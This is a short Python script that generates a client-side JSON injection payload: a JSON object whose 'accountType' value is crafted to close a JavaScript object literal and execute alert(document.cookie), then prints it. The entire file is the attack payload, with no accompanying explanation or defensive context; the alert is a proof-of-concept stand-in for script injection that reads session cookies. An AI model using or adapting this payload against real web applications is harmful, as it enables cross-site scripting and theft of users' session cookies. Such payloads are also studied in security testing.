# client_side_json_injection_payload.py
import json

def generate_client_side_json_injection_payload():
    payload = {
        "accountType": 'user"});alert(document.cookie);({"accountType":"user',
        "userName": "john",
        "pass": "password"
    }
    return json.dumps(payload)

print(generate_client_side_json_injection_payload())
